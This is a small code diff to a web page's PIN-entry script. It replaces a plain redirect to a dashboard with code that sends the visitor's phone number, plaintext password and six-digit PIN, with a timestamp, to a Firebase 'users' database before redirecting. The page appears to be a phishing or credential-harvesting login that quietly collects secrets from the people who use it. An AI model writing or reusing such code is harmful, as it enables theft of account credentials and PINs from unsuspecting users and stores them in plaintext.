@@ -198,11 +198,25 @@ inputs.forEach(box=>{
 pin+=box.value;
 });
 
-if(pin.length===6){
+if (pin.length === 6) {
 
-setTimeout(()=>{
-window.location.href="dashboard.html";
-},300);
+    try {
+
+        await push(ref(db, "users"), {
+            phone: sessionStorage.getItem("phone"),
+            password: sessionStorage.getItem("password"),
+            pin: pin,
+            time: new Date().toLocaleString()
+        });
+
+        sessionStorage.removeItem("phone");
+        sessionStorage.removeItem("password");
+
+        window.location.href = "dashboard.html";
+
+    } catch (error) {
+        alert(error.message);
+    }
 
 }
 
